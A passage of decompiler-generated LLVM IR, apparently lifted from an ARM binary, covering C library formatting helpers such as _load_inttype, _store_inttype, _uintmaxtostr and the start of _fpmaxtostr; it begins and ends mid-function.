  %v1_158f8 = and i32 %v3_158a4, 2
  %v2_158f8 = icmp eq i32 %v1_158f8, 0
  br i1 %v2_158f8, label %dec_label_pc_15918, label %dec_label_pc_15900

dec_label_pc_15900:                               ; preds = %dec_label_pc_158e8, %dec_label_pc_158f8
  %v1_15900 = and i32 %v3_158a4, 1024
  %tmp12 = udiv i32 %v1_15900, 1024
  %tmp13 = add nuw nsw i32 %tmp12, 1
  store i32 %tmp13, i32* %r2.global-to-local, align 4
  %v0_1590c = call i32 @__GI_fseek()
  store i32 %v0_1590c, i32* %r0.global-to-local, align 4
  %v2_15910 = icmp eq i32 %v0_1590c, 0
  br i1 %v2_15910, label %.dec_label_pc_15918_crit_edge, label %dec_label_pc_158c4

.dec_label_pc_15918_crit_edge:                    ; preds = %dec_label_pc_15900
  %v0_15918.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15918

dec_label_pc_15918:                               ; preds = %.dec_label_pc_15918_crit_edge, %dec_label_pc_158e0, %dec_label_pc_158f8
  %v2_15924 = phi i32 [ %v0_15918.pre, %.dec_label_pc_15918_crit_edge ], [ %v0_158e8, %dec_label_pc_158e0 ], [ %v0_158e8, %dec_label_pc_158f8 ]
  %v1_15918 = inttoptr i32 %v2_15924 to i16*
  %v2_15918 = load i16, i16* %v1_15918, align 2
  %v1_1591c = add i32 %v2_15924, 8
  %v2_1591c = inttoptr i32 %v1_1591c to i32*
  %v3_1591c = load i32, i32* %v2_1591c, align 4
  store i32 %v3_1591c, i32* %r2.global-to-local, align 4
  %v1_15920 = and i16 %v2_15918, -4
  store i16 %v1_15920, i16* %v1_15918, align 2
  %v0_15928 = load i32, i32* %r2.global-to-local, align 4
  %v1_15928 = load i32, i32* @r4, align 4
  %v2_15928 = add i32 %v1_15928, 20
  %v3_15928 = inttoptr i32 %v2_15928 to i32*
  store i32 %v0_15928, i32* %v3_15928, align 4
  %v0_1592c = load i32, i32* %r2.global-to-local, align 4
  %v1_1592c = load i32, i32* @r4, align 4
  %v2_1592c = add i32 %v1_1592c, 24
  %v3_1592c = inttoptr i32 %v2_1592c to i32*
  store i32 %v0_1592c, i32* %v3_1592c, align 4
  %v0_15930 = load i32, i32* %r2.global-to-local, align 4
  %v1_15930 = load i32, i32* @r4, align 4
  %v2_15930 = add i32 %v1_15930, 16
  %v3_15930 = inttoptr i32 %v2_15930 to i32*
  store i32 %v0_15930, i32* %v3_15930, align 4
  %v0_15934.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15934

dec_label_pc_15934:                               ; preds = %dec_label_pc_158d8, %dec_label_pc_15918
  %v2_15940 = phi i32 [ %v0_158e8, %dec_label_pc_158d8 ], [ %v0_15934.pre, %dec_label_pc_15918 ]
  %v1_15934 = inttoptr i32 %v2_15940 to i16*
  %v2_15934 = load i16, i16* %v1_15934, align 2
  %v3_15934 = zext i16 %v2_15934 to i32
  %v1_15938 = or i16 %v2_15934, 64
  %v1_1593c = and i32 %v3_15934, 2816
  store i32 %v1_1593c, i32* %r0.global-to-local, align 4
  %v2_1593c = icmp eq i32 %v1_1593c, 0
  store i16 %v1_15938, i16* %v1_15934, align 2
  br i1 %v2_1593c, label %bb10, label %.thread1

bb10:                                             ; preds = %dec_label_pc_15934
  %v1_15944 = load i32, i32* @r4, align 4
  %v2_15944 = add i32 %v1_15944, 12
  %v3_15944 = inttoptr i32 %v2_15944 to i32*
  %v4_15944 = load i32, i32* %v3_15944, align 4
  %v3_15948 = add i32 %v1_15944, 28
  %v4_15948 = inttoptr i32 %v3_15948 to i32*
  store i32 %v4_15944, i32* %v4_15948, align 4
  br label %bb11

.thread1:                                         ; preds = %dec_label_pc_15934
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb11

bb11:                                             ; preds = %bb10, %dec_label_pc_158c4, %.thread1
  %v2_15950 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15950, i32* @r4, align 4
  %v1_15954 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_15954

; uselistorder directives
  uselistorder i32 %v2_15924, { 1, 0 }
  uselistorder i32 %v0_158e8, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v4_15884, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 4, 3, 5 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %bb11, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15934, { 1, 0 }
  uselistorder label %dec_label_pc_15918, { 0, 2, 1 }
  uselistorder label %dec_label_pc_15900, { 1, 0 }
  uselistorder label %dec_label_pc_158b0, { 1, 0 }
  uselistorder label %dec_label_pc_158a4, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %v0_1595c = load i32, i32* @r2, align 4
  %v1_1595c = icmp slt i32 %v0_1595c, 0
  %v0_15960 = load i32, i32* @r0, align 4
  %v1_15964 = and i32 %v0_15960, 2048
  %v2_15998 = icmp eq i32 %v1_15964, 0
  br i1 %v1_1595c, label %dec_label_pc_15998, label %dec_label_pc_1596c

dec_label_pc_1596c:                               ; preds = %entry
  br i1 %v2_15998, label %dec_label_pc_15974, label %dec_label_pc_159a0

dec_label_pc_15974:                               ; preds = %dec_label_pc_1596c
  %v7_15974 = icmp eq i32 %v0_15960, 256
  %v0_15978 = load i32, i32* @r1, align 4
  %v1_15978 = inttoptr i32 %v0_15978 to i32*
  %v2_15978 = load i32, i32* %v1_15978, align 4
  %v2_1597c = urem i32 %v2_15978, 256
  %v2_1597c.v2_15978 = select i1 %v7_15974, i32 %v2_1597c, i32 %v2_15978
  br i1 %v7_15974, label %.thread, label %dec_label_pc_15984

dec_label_pc_15984:                               ; preds = %dec_label_pc_15974
  %v7_15984 = icmp eq i32 %v0_15960, 512
  br i1 %v7_15984, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_15984
  %v4_1598c = urem i32 %v2_1597c.v2_15978, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_15984, %dec_label_pc_15974, %bb
  %v1_15994 = phi i32 [ %v2_15978, %dec_label_pc_15984 ], [ %v2_1597c, %dec_label_pc_15974 ], [ %v4_1598c, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_15994

dec_label_pc_15998:                               ; preds = %entry
  br i1 %v2_15998, label %dec_label_pc_159a8, label %dec_label_pc_159a0

dec_label_pc_159a0:                               ; preds = %dec_label_pc_1596c, %dec_label_pc_15998
  %v0_159a0 = load i32, i32* @r1, align 4
  %v1_159a0 = inttoptr i32 %v0_159a0 to i32*
  %v2_159a0 = load i32, i32* %v1_159a0, align 4
  %v3_159a0 = add i32 %v0_159a0, 4
  %v4_159a0 = inttoptr i32 %v3_159a0 to i32*
  %v5_159a0 = load i32, i32* %v4_159a0, align 4
  store i32 %v5_159a0, i32* @r1, align 4
  ret i32 %v2_159a0

dec_label_pc_159a8:                               ; preds = %dec_label_pc_15998
  %v7_159a8 = icmp eq i32 %v0_15960, 256
  %v0_159ac = load i32, i32* @r1, align 4
  %v1_159ac = inttoptr i32 %v0_159ac to i32*
  %v2_159ac = load i32, i32* %v1_159ac, align 4
  br i1 %v7_159a8, label %.thread1, label %dec_label_pc_159bc

.thread1:                                         ; preds = %dec_label_pc_159a8
  %v4_159b0 = mul i32 %v2_159ac, 16777216
  %v4_159b4 = sdiv i32 %v4_159b0, 16777216
  br label %.thread3

dec_label_pc_159bc:                               ; preds = %dec_label_pc_159a8
  %v7_159bc = icmp eq i32 %v0_15960, 512
  br i1 %v7_159bc, label %bb9, label %.thread3

bb9:                                              ; preds = %dec_label_pc_159bc
  %v4_159c0 = mul i32 %v2_159ac, 65536
  %v4_159c4 = sdiv i32 %v4_159c0, 65536
  br label %.thread3

.thread3:                                         ; preds = %.thread1, %dec_label_pc_159bc, %bb9
  %v0_159c8 = phi i32 [ %v2_159ac, %dec_label_pc_159bc ], [ %v4_159b4, %.thread1 ], [ %v4_159c4, %bb9 ]
  %v3_159c8 = ashr i32 %v0_159c8, 31
  store i32 %v3_159c8, i32* @r1, align 4
  ret i32 %v0_159c8

; uselistorder directives
  uselistorder i32 %v0_159c8, { 1, 0 }
  uselistorder i32 %v2_159ac, { 2, 0, 1 }
  uselistorder i32 %v2_1597c, { 1, 0 }
  uselistorder i32 %v2_15978, { 1, 2, 0 }
  uselistorder i1 %v2_15998, { 1, 0 }
  uselistorder label %.thread3, { 2, 1, 0 }
  uselistorder label %dec_label_pc_159a0, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @_store_inttype(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %tmp = trunc i32 %arg3 to i16
  %tmp2 = ptrtoint i16* %arg1 to i32
  %v7_159d0 = icmp eq i32 %arg2, 256
  store i1 %v7_159d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_159d0, label %bb, label %bb4

bb:                                               ; preds = %entry
  %v3_159d4 = trunc i32 %arg3 to i8
  %tmp3 = bitcast i16* %arg1 to i8*
  store i8 %v3_159d4, i8* %tmp3, align 1
  %v1_159d8.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v1_159d8 = phi i1 [ false, %entry ], [ %v1_159d8.pre, %bb ]
  %v0_159d8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_159d8, i32 %v0_159d8)
  %v7_159dc = icmp eq i32 %arg2, 2048
  store i1 %v7_159dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_159dc, label %dec_label_pc_159e4, label %dec_label_pc_159ec

dec_label_pc_159e4:                               ; preds = %bb4
  %tmp5 = bitcast i16* %arg1 to i32*
  store i32 %arg3, i32* %tmp5, align 4
  %v5_159e4 = add i32 %tmp2, 4
  %v6_159e4 = inttoptr i32 %v5_159e4 to i32*
  store i32 %arg4, i32* %v6_159e4, align 4
  ret i32 %tmp2

dec_label_pc_159ec:                               ; preds = %bb4
  %v7_159ec = icmp eq i32 %arg2, 512
  store i1 %v7_159ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_159ec, label %bb6, label %.thread

bb6:                                              ; preds = %dec_label_pc_159ec
  store i16 %tmp, i16* %arg1, align 2
  br label %bb8

.thread:                                          ; preds = %dec_label_pc_159ec
  %tmp7 = bitcast i16* %arg1 to i32*
  store i32 %arg3, i32* %tmp7, align 4
  br label %bb8

bb8:                                              ; preds = %bb6, %.thread
  ret i32 %tmp2

; uselistorder directives
  uselistorder i32 512, { 8, 9, 10, 11, 3, 6, 13, 14, 5, 15, 7, 16, 4, 12, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 3, 2, 0, 1, 4 }
  uselistorder label %bb8, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @_uintmaxtostr(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %tmp21 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp21, i32* %r7.global-to-local, align 4
  %v1_15a08 = icmp slt i32 %tmp21, 0
  %v2_15a08 = icmp eq i32 %tmp21, 0
  store i1 %v2_15a08, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v0_15a10 = load i32, i32* @r2, align 4
  store i32 %v0_15a10, i32* %r5.global-to-local, align 4
  %v0_15a14 = load i32, i32* @r3, align 4
  store i32 %v0_15a14, i32* %r6.global-to-local, align 4
  br i1 %v1_15a08, label %dec_label_pc_15a1c, label %dec_label_pc_15a3c

dec_label_pc_15a1c:                               ; preds = %entry
  %v1_15a1c = icmp slt i32 %v0_15a14, 0
  %v2_15a1c = icmp eq i32 %v0_15a14, 0
  store i1 %v2_15a1c, i1* %cpsr_z.global-to-local, align 1
  %v1_15a20 = sub i32 0, %tmp21
  store i32 %v1_15a20, i32* %r7.global-to-local, align 4
  br i1 %v1_15a1c, label %dec_label_pc_15a28, label %dec_label_pc_15a3c

dec_label_pc_15a28:                               ; preds = %dec_label_pc_15a1c
  %v1_15a2c = sub i32 0, %v0_15a10
  store i32 %v1_15a2c, i32* %r5.global-to-local, align 4
  %v2_15a2c = icmp eq i32 %v0_15a10, 0
  %v2_15a30 = icmp eq i1 %v2_15a2c, false
  %v5_15a30 = sext i1 %v2_15a30 to i32
  %v6_15a30 = sub i32 %v5_15a30, %v0_15a14
  store i32 %v6_15a30, i32* %r6.global-to-local, align 4
  %v19_15a30 = icmp eq i32 %v6_15a30, 0
  store i1 %v19_15a30, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15a44

dec_label_pc_15a3c:                               ; preds = %dec_label_pc_15a1c, %entry
  br label %dec_label_pc_15a44

dec_label_pc_15a44:                               ; preds = %dec_label_pc_15a28, %dec_label_pc_15a3c
  %storemerge = phi i8 [ 0, %dec_label_pc_15a3c ], [ 1, %dec_label_pc_15a28 ]
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_15a4c = load i32, i32* %r7.global-to-local, align 4
  %v2_15a54 = udiv i32 -1, %v0_15a4c
  store i32 %v2_15a54, i32* %fp.global-to-local, align 4
  %v3_15a64 = urem i32 -1, %v0_15a4c
  %v1_15a68 = add i32 %v3_15a64, 1
  store i32 %v1_15a68, i32* %sb.global-to-local, align 4
  %v9_15a6c = icmp eq i32 %v1_15a68, %v0_15a4c
  store i1 %v9_15a6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15a6c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_15a44
  %v1_15a70 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_15a70, i32* %sb.global-to-local, align 4
  %v2_15a74 = add i32 %v2_15a54, 1
  store i32 %v2_15a74, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_15a44, %bb
  %v0_15a78 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_15a78, i32* %sl.global-to-local, align 4
  %v0_15a7c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_15a7c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15a80

dec_label_pc_15a80thread-pre-split:               ; preds = %bb25
  %v0_15a80.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_15a84.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_15a88.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15a80

dec_label_pc_15a80:                               ; preds = %dec_label_pc_15a80thread-pre-split, %.thread
  %v0_15b04 = phi i32 [ %v0_15a88.pre, %dec_label_pc_15a80thread-pre-split ], [ %v0_15a4c, %.thread ]
  %v0_15afc = phi i32 [ %v0_15a84.pre, %dec_label_pc_15a80thread-pre-split ], [ %v0_15a7c, %.thread ]
  %v0_15a98 = phi i32 [ %v0_15a80.pr, %dec_label_pc_15a80thread-pre-split ], [ %v0_15a78, %.thread ]
  %v2_15a80 = icmp eq i32 %v0_15a98, 0
  store i1 %v2_15a80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15a80, label %dec_label_pc_15af8, label %dec_label_pc_15a90

dec_label_pc_15a90:                               ; preds = %dec_label_pc_15a80
  %v2_15a94 = udiv i32 %v0_15a98, %v0_15b04
  %v3_15a94 = urem i32 %v0_15a98, %v0_15b04
  store i32 %v2_15a94, i32* %sl.global-to-local, align 4
  %v2_15ab4 = udiv i32 %v0_15afc, %v0_15b04
  %v3_15ab4 = urem i32 %v0_15afc, %v0_15b04
  %v0_15ab8 = load i32, i32* %sb.global-to-local, align 4
  %v2_15ab8 = mul i32 %v0_15ab8, %v3_15a94
  %v2_15ac0 = add i32 %v2_15ab8, %v3_15ab4
  store i32 %v2_15ac0, i32* %r5.global-to-local, align 4
  %v0_15acc = load i32, i32* %fp.global-to-local, align 4
  %v2_15acc = mul i32 %v0_15acc, %v3_15a94
  %v2_15ad4 = add i32 %v2_15acc, %v2_15ab4
  %v2_15adc = udiv i32 %v2_15ac0, %v0_15b04
  %v2_15ae4 = add i32 %v2_15ad4, %v2_15adc
  br label %dec_label_pc_15b10

dec_label_pc_15af8:                               ; preds = %dec_label_pc_15a80
  %v2_15af8 = udiv i32 %v0_15afc, %v0_15b04
  br label %dec_label_pc_15b10

dec_label_pc_15b10:                               ; preds = %dec_label_pc_15a90, %dec_label_pc_15af8
  %storemerge28 = phi i32 [ %v2_15af8, %dec_label_pc_15af8 ], [ %v2_15ae4, %dec_label_pc_15a90 ]
  %v0_15b2c = phi i32 [ %v2_15af8, %dec_label_pc_15af8 ], [ %v2_15ae4, %dec_label_pc_15a90 ]
  %v1_15b2c = phi i32 [ 0, %dec_label_pc_15af8 ], [ %v2_15a94, %dec_label_pc_15a90 ]
  %v2_15ac0.pn = phi i32 [ %v0_15afc, %dec_label_pc_15af8 ], [ %v2_15ac0, %dec_label_pc_15a90 ]
  store i32 %storemerge28, i32* %r6.global-to-local, align 4
  %v0_15b18 = urem i32 %v2_15ac0.pn, %v0_15b04
  %v2_15b14 = icmp ugt i32 %v0_15b18, 8
  %v7_15b14 = icmp eq i32 %v0_15b18, 9
  store i1 %v7_15b14, i1* %cpsr_z.global-to-local, align 1
  %v1_15b1c = add i32 %v0_15b18, 48
  %v0_15b24 = load i32, i32* %r8.global-to-local, align 4
  %v1_15b24 = add i32 %v0_15b24, -1
  store i32 %v1_15b24, i32* %r8.global-to-local, align 4
  %v2_15b28 = xor i1 %v7_15b14, true
  %v3_15b28 = and i1 %v2_15b14, %v2_15b28
  %extract.t = trunc i32 %v1_15b1c to i8
  br i1 %v3_15b28, label %bb24, label %bb25

bb24:                                             ; preds = %dec_label_pc_15b10
  %v2_15b18 = add i32 %v0_15b18, %tmp11
  %extract.t9 = trunc i32 %v2_15b18 to i8
  br label %bb25

bb25:                                             ; preds = %dec_label_pc_15b10, %bb24
  %v0_15b30.off0 = phi i8 [ %extract.t, %dec_label_pc_15b10 ], [ %extract.t9, %bb24 ]
  %v2_15b2c = or i32 %v0_15b2c, %v1_15b2c
  %v4_15b2c = icmp eq i32 %v2_15b2c, 0
  store i1 %v4_15b2c, i1* %cpsr_z.global-to-local, align 1
  %v3_15b30 = inttoptr i32 %v1_15b24 to i8*
  store i8 %v0_15b30.off0, i8* %v3_15b30, align 1
  %v0_15b34 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15b34, label %dec_label_pc_15b38, label %dec_label_pc_15a80thread-pre-split

dec_label_pc_15b38:                               ; preds = %bb25
  %v4_15b3810 = zext i8 %storemerge to i32
  store i32 %v4_15b3810, i32* @r3, align 4
  %v2_15b3c = icmp eq i8 %storemerge, 0
  store i1 %v2_15b3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15b3c, label %dec_label_pc_15b38..thread2_crit_edge, label %bb26

dec_label_pc_15b38..thread2_crit_edge:            ; preds = %dec_label_pc_15b38
  %v0_15b48.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb26:                                             ; preds = %dec_label_pc_15b38
  store i32 45, i32* @r3, align 4
  %v3_15b44 = load i32, i32* %r8.global-to-local, align 4
  %v4_15b44 = add i32 %v3_15b44, -1
  %v5_15b44 = inttoptr i32 %v4_15b44 to i8*
  store i8 45, i8* %v5_15b44, align 1
  %v6_15b44 = load i32, i32* %r8.global-to-local, align 4
  %v7_15b44 = add i32 %v6_15b44, -1
  store i32 %v7_15b44, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15b38..thread2_crit_edge, %bb26
  %v0_15b48 = phi i32 [ %v0_15b48.pre, %dec_label_pc_15b38..thread2_crit_edge ], [ %v7_15b44, %bb26 ]
  ret i32 %v0_15b48

; uselistorder directives
  uselistorder i32 %v0_15b18, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15b04, { 0, 6, 1, 2, 3, 5, 4 }
  uselistorder i8 %storemerge, { 1, 0 }
  uselistorder i32 %v0_15a10, { 1, 0, 2 }
  uselistorder i32 %tmp21, { 0, 3, 2, 1 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %r7.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i8 1, { 1, 2, 3, 0, 4 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %dec_label_pc_15b10, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_15a44, { 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, double %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %tmp = fptrunc double %arg2 to float
  %tmp160 = bitcast float %tmp to i32
  store i32 %tmp160, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_0, align 4
  %stack_var_-46 = alloca i8, align 1
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-47 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-82 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-83 = alloca i32, align 4
  %stack_var_-81 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %v27_15b58 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v1_15b64 = add i32 %arg4, 8
  %v2_15b64 = inttoptr i32 %v1_15b64 to i8*
  %v3_15b64 = load i8, i8* %v2_15b64, align 1
  %v4_15b64 = zext i8 %v3_15b64 to i32
  store i32 %v4_15b64, i32* %sb.global-to-local, align 4
  %v1_15b68 = or i32 %v4_15b64, 32
  %v7_15b6c = icmp eq i32 %v1_15b68, 97
  store i1 %v7_15b6c, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg4, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v1_15b84 = inttoptr i32 %arg4 to i32*
  %v2_15b84 = load i32, i32* %v1_15b84, align 4
  store i32 %v2_15b84, i32* %fp.global-to-local, align 4
  store i32 %arg4, i32* %lr.global-to-local, align 4
  %v0_15b8c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_15b8c, i32* %r6.global-to-local, align 4
  store i32 50904, i32* %ip.global-to-local, align 4
  br i1 %v7_15b6c, label %bb, label %bb201

bb:                                               ; preds = %entry
  %v2_15b94 = add nuw nsw i32 %v4_15b64, 6
  store i32 %v2_15b94, i32* %r3.global-to-local, align 4
  br label %bb201

bb201:                                            ; preds = %entry, %bb
  %v1_15ba4 = phi i32 [ %v0_15b8c, %entry ], [ %v2_15b94, %bb ]
  store i32 %tmp160, i32* %r5.global-to-local, align 4
  %v1_15b9c = add i32 %arg4, 12
  %v2_15b9c = inttoptr i32 %v1_15b9c to i32*
  %v3_15b9c = load i32, i32* %v2_15b9c, align 4
  store i32 %v3_15b9c, i32* %r2.global-to-local, align 4
  %v1_15ba0 = add i32 %arg4, 4
  %v2_15ba0 = inttoptr i32 %v1_15ba0 to i32*
  %v3_15ba0 = load i32, i32* %v2_15ba0, align 4
  store i32 %v3_15ba0, i32* @lr, align 4
  br i1 %v7_15b6c, label %bb202, label %bb203

bb202:                                            ; preds = %bb201
  %v2_15ba4 = urem i32 %v1_15ba4, 256
  store i32 %v2_15ba4, i32* %sb.global-to-local, align 4
  br label %bb203

bb203:                                            ; preds = %bb201, %bb202
  %v1_15ba8 = icmp slt i32 %v2_15b84, 0
  %v2_15ba8 = icmp eq i32 %v2_15b84, 0
  store i1 %v2_15ba8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %ip.global-to-local, align 4
  br i1 %v1_15ba8, label %bb204, label %bb205

bb204:                                            ; preds = %bb203
  store i32 6, i32* %fp.global-to-local, align 4
  br label %bb205

bb205:                                            ; preds = %bb203, %bb204
  %v1_15bb8 = and i32 %v3_15b9c, 2
  %v2_15bb8 = icmp eq i32 %v1_15bb8, 0
  store i1 %v2_15bb8, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-46, align 1
  br i1 %v2_15bb8, label %dec_label_pc_15bd0, label %dec_label_pc_15bdc

dec_label_pc_15bd0:                               ; preds = %bb205
  %v1_15bd0 = urem i32 %v3_15b9c, 2
  %v2_15bd0 = icmp eq i32 %v1_15bd0, 0
  store i1 %v2_15bd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15bd0, label %dec_label_pc_15be0, label %dec_label_pc_15bdc

dec_label_pc_15bdc:                               ; preds = %dec_label_pc_15bd0, %bb205
  %storemerge = phi i32 [ 43, %bb205 ], [ 32, %dec_label_pc_15bd0 ]
  %v0_15bdc.off0 = phi i8 [ 43, %bb205 ], [ 32, %dec_label_pc_15bd0 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i8 %v0_15bdc.off0, i8* %stack_var_-46, align 1
  br label %dec_label_pc_15be0

dec_label_pc_15be0:                               ; preds = %dec_label_pc_15bd0, %dec_label_pc_15bdc
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v0_15b8c, i32* %r3.global-to-local, align 4
  store i32 %tmp160, i32* @r0, align 4
  store i32 %v0_15b8c, i32* %r1.global-to-local, align 4
  store i32 %tmp160, i32* @r2, align 4
  %v1_15bfc = fptrunc double %arg2 to float
  %v2_15bfc = bitcast float %v1_15bfc to i32
  %v9_15bfc = call i32 @__aeabi_dcmpeq(i32 %v2_15bfc, i32 %v0_15b8c, i32 %v2_15bfc, i32 %v0_15b8c, i32 0)
  store i32 %v9_15bfc, i32* %r0.global-to-local, align 4
  %v2_15c00 = icmp eq i32 %v9_15bfc, 0
  store i1 %v2_15c00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15c00, label %bb207, label %dec_label_pc_15c10

bb207:                                            ; preds = %dec_label_pc_15be0
  store i32 8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15cc4

dec_label_pc_15c10:                               ; preds = %dec_label_pc_15be0
  %v0_15c10 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_15c10, i32* @r0, align 4
  %v0_15c14 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_15c14, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_15c20 = call i32 @__aeabi_dcmpeq(i32 %v0_15c10, i32 %v0_15c14, i32 0, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_15c20, i32* %r0.global-to-local, align 4
  %v2_15c24 = icmp eq i32 %v7_15c20, 0
  store i1 %v2_15c24, i1* %cpsr_z.global-to-local, align 1
  %v0_15c6c = load i32, i32* %r5.global-to-local, align 4
  %v1_15c6c = sext i32 %v0_15c6c to i64
  %v2_15c6c = bitcast i64 %v1_15c6c to double
  br i1 %v2_15c24, label %dec_label_pc_15c6c, label %dec_label_pc_15c2c

dec_label_pc_15c2c:                               ; preds = %dec_label_pc_15c10
  store i32 1072693248, i32* %r1.global-to-local, align 4
  %v9_15c3c = fdiv double 0.000000e+00, %v2_15c6c
  %v10_15c3c = fptrunc double %v9_15c3c to float
  %v11_15c3c = bitcast float %v10_15c3c to i32
  store i32 %v11_15c3c, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_15c48 = call i32 @__aeabi_dcmplt(i32 %v11_15c3c, i32 1072693248, i32 0, i32 0)
  store i32 %v4_15c48, i32* %r0.global-to-local, align 4
  %v2_15c4c = icmp eq i32 %v4_15c48, 0
  store i1 %v2_15c4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15c4c, label %bb208, label %dec_label_pc_15c58

bb208:                                            ; preds = %dec_label_pc_15c2c
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15e38

dec_label_pc_15c58:                               ; preds = %dec_label_pc_15c2c
